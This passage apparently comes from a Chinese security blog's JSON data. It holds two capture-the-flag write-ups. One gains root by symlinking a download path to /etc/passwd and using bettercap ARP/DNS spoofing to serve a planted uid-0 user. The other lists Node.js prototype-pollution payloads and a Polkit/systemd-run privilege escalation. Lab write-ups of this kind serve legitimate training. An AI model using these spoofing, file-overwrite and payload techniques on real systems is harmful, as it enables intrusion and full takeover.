self._safe_read(self.length)\n  File '/usr/lib/python3.9/http/client.py', line 612, in _safe_read\n    data = self.fp.read(amt)\n  File '/usr/lib/python3.9/socket.py', line 704, in readinto\n    return self._sock.recv_into(b)\nKeyboardInterrupt\n```\n\n\u53ef\u4ee5\u770b\u5230\u6267\u884c sudo /usr/bin/cupp -l \u540e\uff0c\u811a\u672c\u4f1a\u4ece\u4e00\u4e2a\u56fa\u5b9a\u7684 URL (http://ftp.funet.fi/...) \u4e0b\u8f7d\u6587\u4ef6\u3002\u4e0b\u8f7d\u7684\u6587\u4ef6\u4f1a\u4fdd\u5b58\u5728**\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55**\u4e0b\uff0c\u5e76\u521b\u5efa\u4e00\u4e2a `dictionaries/` \u5b50\u76ee\u5f55\u7ed3\u6784\u3002\u4f8b\u5982\uff0c\u9009\u62e9 1 Moby\uff0c\u5b83\u4f1a\u5c1d\u8bd5\u521b\u5efa\u5e76\u5199\u5165\u6587\u4ef6\u5230 `./dictionaries/Moby/mhyph.tar.gz`\u3002\u56e0\u4e3a\u547d\u4ee4\u662f\u4ee5 sudo \u6267\u884c\u7684\uff0c\u6240\u4ee5\u6587\u4ef6\u5199\u5165\u64cd\u4f5c\u62e5\u6709 root \u6743\u9650\u3002\n\n\u8fd9\u91cc\u5c31\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u4ed6\u6ca1\u6709\u68c0\u67e5\u76ee\u6807\u8def\u5f84\u662f\u5426\u4e3a\u4e00\u4e2a\u7b26\u53f7\u94fe\u63a5\uff0c\u6240\u4ee5\u6211\u4eec\u60f3\u8986\u76d6\u4ec0\u4e48\u5c31\u8986\u76d6\u4ec0\u4e48\n\n```bash\ntodd@Multi:~$ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nmessagebus:x:104:110::/nonexistent:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\nxiao:x:1001:1001::/home/xiao:/bin/bash\ntelnetd:x:106:113::/nonexistent:/usr/sbin/nologin\nredis:x:107:114::/var/lib/redis:/usr/sbin/nologin\nftp:x:108:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\nsecure_user:x:1002:1002::/home/secure_user:/bin/bash\nmysql:x:109:116:MySQL Server,,,:/nonexistent:/bin/false\nsamba_user:x:1003:1003::/home/samba_user:/bin/false\n_rpc:x:110:65534::/run/rpcbind:/usr/sbin/nologin\nstatd:x:111:65534::/var/lib/nfs:/usr/sbin/nologin\npostgres:x:112:119:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\ntodd:x:1000:1000:,,,:/home/todd:/bin/bash\n\ntodd@Multi:~$ find dictionaries/\ndictionaries/\ndictionaries/Moby\ndictionaries/Moby/mhyph.tar.gz\n```\n\n\u5148\u5c06\u73b0\u5728\u7684dictionaries\u91cd\u547d\u540d\u4e3a1\uff08\u5728\u6211\u4eec\u7684\u5bb6\u76ee\u5f55\u4e0b\uff0c\u6211\u4eec\u6709\u7edd\u5bf9\u7684\u6743\u9650\uff09\uff0c\u5e76\u4f2a\u9020\u4e00\u4e2a\u6076\u610f\u7684dictionaries\n\n```bash\ntodd@Multi:~$ mv dictionaries/ 1\ntodd@Multi:~$ mkdir -p dictionaries/Moby\ntodd@Multi:~$ cd dictionaries/Moby/\ntodd@Multi:~/dictionaries/Moby$ ln -s /etc/passwd mhyph.tar.gz\n```\n\n\u5207\u6362\u5230kail\uff0c\u6309\u7167\u4ed6\u7684passwd\u5728\u6700\u540e\u4e00\u884c\u7ed9\u81ea\u5df1\u52a0\u4e00\u4e2a\u7279\u6743\u7528\u6237\uff0c\u7136\u540e\u91cd\u547d\u540d\uff0c\u5f00\u4e00\u4e2aweb\u670d\u52a1\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ cd tmp \n                          \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ mkdir -p ./pub/unix/security/passwd/crack/dictionaries/Moby/\n                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ mkdir -p ./pub/unix/security/passwd/crack/dictionaries/Moby/\n                               \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ vim ./pub/unix/security/passwd/crack/dictionaries/Moby/pass        \n                       \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ tail -n 1 ./pub/unix/security/passwd/crack/dictionaries/Moby/pass\nb:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ mv ./pub/unix/security/passwd/crack/dictionaries/Moby/pass ./pub/unix/security/passwd/crack/dictionaries/Moby/mhyph.tar.gz\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ python3 -m http.server 80  \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\n\n\u542f\u52a8 DNS \u6b3a\u9a97\n\n```bash\nsudo bettercap\n>> set arp.spoof.targets 192.168.205.205\n>> set dns.spoof.domains ftp.funet.fi\n>> set dns.spoof.address 192.168.205.128\n>> arp.spoof on\n>> dns.spoof on\n```\n\n\u89e6\u53d1\u6f0f\u6d1e\n\n```bash\ntodd@Multi:~/dictionaries/Moby$ cd \ntodd@Multi:~$ sudo /usr/bin/cupp -l\n ___________ \n   cupp.py!                 # Common\n      \\                     # User\n       \\   ,__,             # Passwords\n        \\  (oo)____         # Profiler\n           (__)    )\\   \n              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]\n                            [ Mebus | https://github.com/Mebus/]\n\n\n        Choose the section you want to download:\n\n     1   Moby            14      french          27      places\n     2   afrikaans       15      german          28      polish\n     3   american        16      hindi           29      random\n     4   aussie          17      hungarian       30      religion\n     5   chinese         18      italian         31      russian\n     6   computer        19      japanese        32      science\n     7   croatian        20      latin           33      spanish\n     8   czech           21      literature      34      swahili\n     9   danish          22      movieTV         35      swedish\n    10   databases       23      music           36      turkish\n    11   dictionaries    24      names           37      yiddish\n    12   dutch           25      net             38      exit program\n    13   finnish         26      norwegian       \n\n\n        Files will be downloaded from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/ repository\n\n        Tip: After downloading wordlist, you can improve it with -w option\n\n> Enter number: 1\n[+] Downloading dictionaries/Moby/mhyph.tar.gz from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/Moby/mhyph.tar.gz ... \n[+] Downloading dictionaries/Moby/mlang.tar.gz from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/Moby/mlang.tar.gz ... \nTraceback (most recent call last):\n  File '/usr/bin/cupp', line 1078, in <module>\n    main()\n  File '/usr/bin/cupp', line 1024, in main\n    download_wordlist()\n  File '/usr/bin/cupp', line 782, in download_wordlist\n    download_wordlist_http(filedown)\n  File '/usr/bin/cupp', line 993, in download_wordlist_http\n    download_http(url, tgt)\n  File '/usr/bin/cupp', line 696, in download_http\n    webFile = urllib.request.urlopen(url)\n  File '/usr/lib/python3.9/urllib/request.py', line 214, in urlopen\n    return opener.open(url, data, timeout)\n  File '/usr/lib/python3.9/urllib/request.py', line 523, in open\n    response = meth(req, response)\n  File '/usr/lib/python3.9/urllib/request.py', line 632, in http_response\n    response = self.parent.error(\n  File '/usr/lib/python3.9/urllib/request.py', line 561, in error\n    return self._call_chain(*args)\n  File '/usr/lib/python3.9/urllib/request.py', line 494, in _call_chain\n    result = func(*args)\n  File '/usr/lib/python3.9/urllib/request.py', line 641, in http_error_default\n    raise HTTPError(req.full_url, code, msg, hdrs, fp)\nurllib.error.HTTPError: HTTP Error 404: File not found\n```\n\n\u62a5\u9519\u4e86\uff0c\u5e76\u4e14bettercap\u548cpyton web\u90fd\u6709\u63d0\u793a\u5c31\u662f\u6210\u529f\u4e86\n\n```bash\ntodd@Multi:~$ su b\nPassword: \nroot@Multi:/home/todd# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@Multi:/home/todd# cat /root/root.txt /home/xiao/user.txt \nflag{root-922c8837565de5bd2e342c65a2e67ef9}\nflag{user-33b02bc15ce9557d2dd8484d58f95ac4}\n```\n\nsentence", "top": 0, "createdAt": 1754441199, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P178": {"htmlDir": "docs/post/nei-bu-_Node.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Node", "postUrl": "post/nei-bu-_Node.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/178", "commentNum": 0, "wordCount": 5813, "description": "\u770b\u5230\u4e00\u4e2a\u6709\u610f\u601d\u7684\u9776\u673a\uff0c\u6c34\u4e2awp\n\n\u5b87\u5b99\u58f0\u660e\uff0c\u5176\u4e2d\u6709\u4e00\u4e9b\u77e5\u8bc6\u70b9\u53ef\u80fd\u4f1a\u51fa\u73b0\u9519\u8bef\uff0c\u4ecb\u610f\u52ff\u770b\uff0c\u5f53\u7136\u4f60\u6709\u66f4\u597d\u7684\u89c2\u70b9\u53ef\u4ee5\u63d0\u51fa\u6765\uff0c\u6211\u8fdb\u884c\u4fee\u6539\uff0c\u8c22\u8c22\u3002\n# \u9776\u673a\u6e17\u900f\u6d4b\u8bd5\u62a5\u544a\uff1aNode\n\n![image-20250726214136966](http://7r1UMPHK.github.io/image/20250727170012871.webp)\n\n## \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n### 1. \u4e3b\u673a\u53d1\u73b0\n\n\u4f7f\u7528 `arp-scan` \u626b\u63cf\u672c\u5730\u7f51\u7edc\uff0c\u53d1\u73b0\u76ee\u6807\u4e3b\u673a\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n...\n192.168.205.223 08:00:27:50:f2:67       PCS Systemtechnik GmbH\n...\n```\n\n\u76ee\u6807\u4e3b\u673a IP \u5730\u5740\u4e3a `192.168.205.223`\u3002\n\n### 2. \u7aef\u53e3\u4e0e\u670d\u52a1\u626b\u63cf\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.223\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 09:42 EDT\nNmap scan report for 192.168.205.223\nHost is up (0.00013s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n3000/tcp open  ppp\nMAC Address: 08:00:27:50:F2:67 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n```\n\n\u626b\u63cf\u53d1\u73b0\u5f00\u653e\u4e86 22 (SSH) \u548c 3000 \u7aef\u53e3\u30023000 \u7aef\u53e3\u901a\u5e38\u7528\u4e8e Web \u5f00\u53d1\u670d\u52a1\u3002\n\n# \u4e8c\u3001\u521d\u59cb\u8bbf\u95ee\n\n## Web \u6e17\u900f (Port 3000)\n\n\u8bbf\u95ee `http://192.168.205.223:3000`\uff0c\u53d1\u73b0\u4e00\u4e2a Web \u5e94\u7528\uff0c\u8fd9\u662f\u4e00\u4e2a\u591a\u9636\u6bb5\u7684 Node.js \u539f\u578b\u94fe\u6c61\u67d3\u6311\u6218\u3002\n\n![image-20250726214316960](http://7r1UMPHK.github.io/image/20250727170021649.webp)\n\n\u8fd9\u91cc\u4e24\u4e2a\u73a9\u6cd5\uff0c\u7b2c\u4e00\u79cd\u4f60\u8fc7\u4e86\u7b2c\u4e00\u9898\uff0c\u4e0b\u4e00\u4e2aFindSomething\u63d2\u4ef6\uff0c\u4f60\u4f1a\u53d1\u73b0\u6709\u4e00\u4e2aPATH`/admin/flag`\uff0c\u4e00\u770b\u5c31\u6709\u95ee\u9898\u597d\u5427\uff0c\u90a3\u91cc\u4f1a\u76f4\u63a5\u83b7\u5f97ssh\u7684\u7528\u6237\u548c\u5bc6\u7801\uff08\u8981\u505a\u4e00\u9898\u62ff\u4e2aadmin\u7684cookie\uff09\n\n\u7b2c\u4e8c\u79cd\u5c31\u662f\u8001\u8001\u5b9e\u5b9e\u7684\n\n- **\u5173\u5361 1: \u57fa\u7840\u539f\u578b\u6c61\u67d3**\n\n```json\n{\n  '__proto__': {\n    'isAdmin': true\n  }\n}\n```\n\n- **\u5173\u5361 2: \u7ed5\u8fc7\u7b80\u5355\u9632\u62a4**\n\n```json\n{\n  'constructor': {\n    'prototype': {\n      'isAdmin': true\n    }\n  }\n}\n```\n\n- **\u5173\u5361 3: \u591a\u5c42\u539f\u578b\u6c61\u67d3**\n\n```json\n{\n  'a': {\n    '__proto__': {\n      'isAdmin': true\n    }\n  }\n}\n```\n\n- **\u5173\u5361 4: \u52a8\u6001\u9a8c\u8bc1\u7ed5\u8fc7**\n\n```json\n{\n  'validateAccess': 'function() { return true; }'\n}\n```\n\n*ps:\u8fd9\u4e0d\u50cf\u539f\u578b\u94fe\u6c61\u67d3\uff0c\u53cd\u800c\u5f88\u50cf\u4e0d\u5b89\u5168\u53cd\u5e8f\u5217\u5316*\n\n\u6210\u529f\u5b8c\u6210\u6240\u6709\u5173\u5361\u540e\uff0c\u5e94\u7528\u8fd4\u56de\u51ed\u8bc1\u4fe1\u606f\uff1a\n\n>\u6311\u6218\u6210\u529f!\n>\n>\u4f60\u7684Flag\u662f: **{hungry:imveryhungry}**\n>\n>\u606d\u559c\u4f60\u5b8c\u6210\u4e86\u6311\u6218\uff01\n\n### SSH \u767b\u5f55\n\n\u4f7f\u7528\u83b7\u53d6\u5230\u7684\u51ed\u8bc1\u901a\u8fc7 SSH \u767b\u5f55\u76ee\u6807\u4e3b\u673a\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ ssh hungry@192.168.205.223\n...\nhungry@Node:~$ id\nuid=1000(hungry) gid=1000(hungry) groups=1000(hungry)\n```\n\n\u6210\u529f\u83b7\u53d6 `hungry` \u7528\u6237\u7684 shell \u6743\u9650\u3002\n\n## \u4e09\u3001\u6743\u9650\u63d0\u5347\n\n## 1. \u672c\u5730\u4fe1\u606f\u679a\u4e3e\n\n\u5728 `hungry` \u7528\u6237\u7684 shell \u4e2d\uff0c\u8fdb\u884c\u63d0\u6743\u5411\u91cf\u7684\u679a\u4e3e\u3002\n\n\n\n* **\u68c0\u67e5 `sudo` \u6743\u9650\uff1a**\n\n  ```bash\n  hungry@Node:~$ sudo -l\n  Sorry, user hungry may not run sudo on Node.\n  ```\n\n  \u7528\u6237 `hungry` \u6ca1\u6709\u4efb\u4f55 `sudo` \u6743\u9650\u3002\n\n* **\u67e5\u627e SUID \u6587\u4ef6\uff1a**\n\n  ```bash\n  hungry@Node:~$ find / -perm -4000 -type f 2>/dev/null\n  /usr/bin/chsh\n  /usr/bin/chfn\n  /usr/bin/newgrp\n  /usr/bin/gpasswd\n  /usr/bin/mount\n  /usr/bin/su\n  /usr/bin/umount\n  /usr/bin/pkexec\n  /usr/bin/sudo\n  /usr/bin/passwd\n  ...\n  /usr/libexec/polkit-agent-helper-1\n  ```\n\n\u6211\u5c31\u4e0d\u7ee7\u7eed\u5199\u4e86\uff0c\u6211\u6252\u62c9\u4e86\u5f88\u4e45\uff0c\u5b9e\u5728\u9876\u4e0d\u4f4f\u4e86\uff0c\u6211\u53bb\u627e\u4f5c\u8005\u8981\u4e86\u70b9\u63d0\u793a\uff0c\u662f`/usr/libexec/polkit-agent-helper-1`\n\n## 2. \u6f0f\u6d1e\u5229\u7528 (`systemd-run` \u63d0\u6743)\n\n\u6839\u636e\u63d0\u793a\uff0c\u5c1d\u8bd5\u4f7f\u7528\u4e0e Polkit \u4ea4\u4e92\u7684 `systemd-run` \u547d\u4ee4\u8fdb\u884c\u63d0\u6743\u3002\n\nhttps://blog.csdn.net/li1136594919/article/details/131488386\n\n```bash\nhungry@Node:~$ systemd-run -t /bin/bash\n==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===\nAuthentication is required to manage system services or other units.\nAuthenticating as: hungry\nPassword: \n==== AUTHENTICATION COMPLETE ===\nRunning as unit: run-u7.service\nPress ^] three times within 1s to disconnect TTY.\nroot@Node:/# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n\u8f93\u5165 `hungry` \u7528\u6237\u7684\u5bc6\u7801\u540e\uff0c\u6210\u529f\u83b7\u53d6\u4e86\u4e00\u4e2a root shell\u3002\n\n## 3. \u539f\u7406\u5206\u6790\uff1aPolkit \u914d\u7f6e\u9519\u8bef\n\n\u672c\u6b21\u63d0\u6743\u5e76\u975e\u5229\u7528\u4e86\u5e38\u89c1\u7684\u5185\u6838\u6f0f\u6d1e\u6216\u8f6f\u4ef6\u6f0f\u6d1e\uff08\u5982PwnKit\uff09\uff0c\u800c\u662f\u4e00\u4e2a\u5178\u578b\u7684**\u5b89\u5168\u914d\u7f6e\u9519\u8bef**\uff0c\u5176\u6838\u5fc3\u5728\u4e8e Polkit \u7684\u6388\u6743\u7b56\u7565\u88ab\u6709\u610f\u5730\u524a\u5f31\u4e86\u3002\n\n1. **\u4ec0\u4e48\u662f Polkit \u548c `systemd-run`\uff1f**\n\n   *   **Polkit (PolicyKit)**: \u662f\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u7ea7\u522b\u7684\u6388\u6743\u6846\u67b6\uff0c\u7528\u4e8e\u63a7\u5236\u54ea\u4e9b\u7528\u6237\u53ef\u4ee5\u6267\u884c\u54ea\u4e9b\u9700\u8981\u7279\u6743\u7684\u64cd\u4f5c\u3002\u5b83\u5c31\u50cf\u4e00\u4e2a\u7cbe\u7ec6\u5316\u7684 `sudo`\uff0c\u4e0d\u76f4\u63a5\u7ed9\u4e88\u7528\u6237 root shell\uff0c\u800c\u662f\u5bf9\u5177\u4f53\u52a8\u4f5c\u8fdb\u884c\u6388\u6743\u3002\n   *   **`systemd-run`**: \u662f\u4e00\u4e2a `systemd` \u5de5\u5177\uff0c\u53ef\u4ee5\u7528\u6765\u52a8\u6001\u521b\u5efa\u4e00\u4e2a\u4e34\u65f6\u7684\u670d\u52a1\u5355\u5143\u5e76\u8fd0\u884c\u6307\u5b9a\u7684\u547d\u4ee4\u3002\u5f53\u5b83\u9700\u8981\u6267\u884c\u7279\u6743\u64cd\u4f5c\uff08\u5982\u4ee5 root \u8eab\u4efd\u8fd0\u884c\u670d\u52a1\uff09\u65f6\uff0c\u4f1a\u5411 `systemd` \u4e3b\u8fdb\u7a0b\uff08\u4ee5 root \u6743\u9650\u8fd0\u884c\uff09\u53d1\u51fa\u8bf7\u6c42\u3002\n\n2. **\u63d0\u6743\u6d41\u7a0b\u662f\u600e\u6837\u7684\uff1f**\n\n   *   \u5f53 `hungry` \u7528\u6237\u6267\u884c `systemd-run -t /bin/bash`\uff0c\u8be5\u547d\u4ee4\u8bf7\u6c42 `systemd` \u4ee5 root \u6743\u9650\u542f\u52a8\u4e00\u4e2a `/bin/bash` \u8fdb\u7a0b\u3002\n   *   `systemd` \u5c06\u8fd9\u4e2a\u8bf7\u6c42\u4ea4\u7531 Polkit \u8fdb\u884c\u6743\u9650\u88c1\u51b3\u3002\n   *   Polkit \u68c0\u67e5\u5176\u7b56\u7565\uff0c\u786e\u5b9a `hungry` \u7528\u6237\u662f\u5426\u6709\u6743\u6267\u884c\u8fd9\u4e2a\u64cd\u4f5c\uff08Action ID \u4e3a `org.freedesktop.systemd1.manage-units`\uff09\u3002\n\n3. **\u6f0f\u6d1e\u7684\u5173\u952e\u70b9\u5728\u54ea\u91cc\uff1f**\n\n   *   \u4ece\u547d\u4ee4\u884c\u7684\u8f93\u51fa `Authenticating as: hungry` \u548c\u8981\u6c42\u8f93\u5165\u5bc6\u7801\u6765\u770b\uff0c\u7cfb\u7edf**\u6b63\u5728**\u8fdb\u884c\u8ba4\u8bc1\u3002\n   *   `org.freedesktop.systemd1.manage-units` \u8fd9\u4e2a\u64cd\u4f5c\u7684\u9ed8\u8ba4\u7b56\u7565\u901a\u5e38\u662f `auth_admin`\uff0c\u610f\u4e3a**\u5fc5\u987b\u7531\u7ba1\u7406\u5458\u7ec4\uff08\u5982 `sudo` \u7ec4\uff09\u7684\u7528\u6237\u6765\u63d0\u4f9b\u5bc6\u7801\u8fdb\u884c\u8ba4\u8bc1**\u3002\n   *   \u7136\u800c\uff0c\u7528\u6237 `hungry` \u5e76\u4e0d\u5728 `sudo` \u7ec4\u91cc\uff0c\u4f46\u63d0\u4f9b\u4e86**\u81ea\u5df1\u7684\u5bc6\u7801**\u540e\u5374\u8ba4\u8bc1\u6210\u529f\u4e86\u3002\u8fd9\u8868\u660e Polkit \u7684\u7b56\u7565\u88ab\u4fee\u6539\u4e86\u3002\n   *   \u6700\u53ef\u80fd\u7684\u4fee\u6539\u662f\u5c06\u8be5\u64cd\u4f5c\u7684\u6388\u6743\u7b56\u7565\u4ece `auth_admin`\uff08\u7ba1\u7406\u5458\u8ba4\u8bc1\uff09\u6539\u4e3a\u4e86 **`auth_self_keep`**\uff08\u7528\u6237\u81ea\u8eab\u8ba4\u8bc1\uff09\u3002\u8fd9\u610f\u5473\u7740\u201c**\u53ea\u8981\u8bf7\u6c42\u8005\u80fd\u8bc1\u660e\u4ed6\u5c31\u662f\u4ed6\u81ea\u5df1\uff08\u901a\u8fc7\u8f93\u5165\u81ea\u5df1\u7684\u5bc6\u7801\uff09\uff0c\u5c31\u5141\u8bb8\u6267\u884c\u8be5\u7279\u6743\u64cd\u4f5c**\u201d\u3002\n\n4. \u9a8c\u8bc1\n\n   \u9700\u8981\u7528\u6237\u4e3aroot\u6743\u9650\uff0c\u5426\u5219\u65e0\u6cd5\u67e5\u770b\n\n   ```bash\n   root@Node:/# cat /etc/polkit-1/rules.d/50-myuser.rules\n   polkit.addRule(function(action, subject) {\n      \n       if (action.id.startsWith('org.freedesktop.systemd1.') && subject.local && subject.isInGroup('hungry')) {\n           return polkit.Result.YES;\n       }\n   });\n   ```\n\n   - polkit.addRule(function(action, subject) { ... });\n     \u8fd9\u5b9a\u4e49\u4e86\u4e00\u6761\u65b0\u7684 Polkit \u89c4\u5219\u3002action \u4ee3\u8868\u5c1d\u8bd5\u6267\u884c\u7684\u64cd\u4f5c\uff0csubject \u4ee3\u8868\u53d1\u8d77\u64cd\u4f5c\u7684\u7528\u6237\u3002\n   - if (action.id.startsWith('org.freedesktop.systemd1.') && ...)\n     \u8fd9\u662f\u7b2c\u4e00\u4e2a\u6761\u4ef6\uff1a\u68c0\u67e5\u8bf7\u6c42\u7684\u64cd\u4f5c ID \u662f\u5426\u4ee5 'org.freedesktop.systemd1.' \u5f00\u5934\u3002\u8fd9\u662f\u4e00\u4e2a\u975e\u5e38\u5bbd\u6cdb\u7684\u89c4\u5219\uff0c\u5b83\u6db5\u76d6\u4e86\u6240\u6709\u4e0e systemd \u76f8\u5173\u7684\u7ba1\u7406\u64cd\u4f5c\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u542f\u52a8/\u505c\u6b62\u670d\u52a1\u3001\u542f\u7528/\u7981\u7528\u670d\u52a1\u5355\u5143\u6587\u4ef6\u7b49\u3002systemd-run \u6240\u89e6\u53d1\u7684\u64cd\u4f5c\u5c31\u5728\u6b64\u8303\u56f4\u5185\u3002\n   - ... && subject.local && ...\n     \u7b2c\u4e8c\u4e2a\u6761\u4ef6\uff1a\u68c0\u67e5\u7528\u6237\u662f\u5426\u4e3a\u672c\u5730\u7528\u6237\u3002\u901a\u8fc7 SSH \u767b\u5f55\u7684\u4ea4\u4e92\u5f0f\u4f1a\u8bdd\u901a\u5e38\u88ab\u8ba4\u4e3a\u662f local \u7684\u3002\n   - ... && subject.isInGroup('hungry'))\n     **\u8fd9\u662f\u6700\u5173\u952e\u7684\u6761\u4ef6**\uff1a\u68c0\u67e5\u53d1\u8d77\u64cd\u4f5c\u7684\u7528\u6237\u662f\u5426\u5c5e\u4e8e\u540d\u4e3a 'hungry' \u7684\u7528\u6237\u7ec4\u3002\u5728\u5f88\u591a Linux \u53d1\u884c\u7248\u4e2d\uff0c\u521b\u5efa\u4e00\u4e2a\u65b0\u7528\u6237\u65f6\u4f1a\u540c\u65f6\u521b\u5efa\u4e00\u4e2a\u540c\u540d\u7684\u4e3b\u7528\u6237\u7ec4\uff0c\u6240\u4ee5\u7528\u6237 hungry \u6b63\u597d\u5c31\u5728 hungry \u7ec4\u91cc\u3002\n   - return polkit.Result.YES;\n     \u5982\u679c\u4ee5\u4e0a\u6240\u6709\u4e09\u4e2a\u6761\u4ef6\u90fd\u6ee1\u8db3\uff0c\u89c4\u5219\u5c31\u8fd4\u56de YES\u3002\u8fd9\u8868\u793a**\u65e0\u6761\u4ef6\u5141\u8bb8\uff0c\u65e0\u9700\u8fdb\u884c\u4efb\u4f55\u8ba4\u8bc1**\u3002\n   - \u806a\u660e\u7684\u670b\u53cb\u80af\u5b9a\u53d1\u73b0\u4e86\uff0c\u4ec0\u4e48\u4e0d\u9700\u8981\u9a8c\u8bc1\uff0c\u6211\u7684\u660e\u660e\u9700\u8981\u9a8c\u8bc1\u554a\uff0c\u90a3\u662f\u56e0\u4e3alinux\u6388\u6743\u548c\u8ba4\u8bc1\u662f\u5206\u79bb\u7684\uff0cPolkit\u5ba1\u67e5\u8fd9\u4e2a\u7528\u6237\uff08hungry\uff09\u6709\u6ca1\u6709\u8d44\u683c\u6267\u884c\u8fd9\u4e2a\u64cd\u4f5c\uff0cPAM\u5ba1\u67e5\u73b0\u5728\u5750\u5728\u7ec8\u7aef\u524d\u8f93\u5165\u547d\u4ee4\u7684\u8fd9\u4e2a\u4eba\uff0c\u771f\u7684\u662fhungry\u672c\u4eba\u5417\uff1f\n\n   \u6240\u4ee5\u603b\u7ed3\u5b9e\u73b0\u4e86**\u5141\u8bb8\u4efb\u4f55\u672c\u5730\u767b\u5f55\u7684\u3001\u4e14\u5c5e\u4e8e** **hungry** **\u7528\u6237\u7ec4\u7684\u7528\u6237\uff0c~~\u65e0\u9700\u5bc6\u7801~~\uff08\u9700\u8981\u5bc6\u7801\uff09\u5373\u53ef\u6267\u884c\u6240\u6709 systemd \u76f8\u5173\u7684\u7ba1\u7406\u64cd\u4f5c\u3002**\n\n   \u800c\u4e3a\u4ec0\u4e48\u62ff\u5230\u7684\u662froot\u7684shell\uff0c\u4e3a\u4ec0\u4e48\u4e0d\u662fhungry\u7684shell\uff0c\u662f\u56e0\u4e3asystemd\u662froot\u8eab\u4efd\u8fd0\u884c\u7684\n\n   \u6240\u4ee5\u518d\u6982\u62ec\u4e00\u4e0b\u5c31\u662f**\u60a8\u662f\u4ee5** **hungry** **\u7684\u8eab\u4efd\u901a\u8fc7\u4e86\u8ba4\u8bc1\uff0c\u4ece\u800c\u83b7\u5f97\u4e86\u201c\u547d\u4ee4** **systemd** **\u53bb\u505a\u4e8b\u201d\u7684\u8d44\u683c\uff1b\u800c\u6700\u7ec8\u4e3a\u60a8\u521b\u5efa shell \u7684\u662f** **systemd** **\u8fdb\u7a0b\uff0c\u5b83\u7528\u7684\u662f\u5b83\u81ea\u5df1\u56fa\u6709\u7684** **root** **\u8eab\u4efd\u3002**\n\n## \u56db\u3001\u593a\u53d6\u65d7\u5e1c\n\n\u6210\u529f\u83b7\u53d6 root 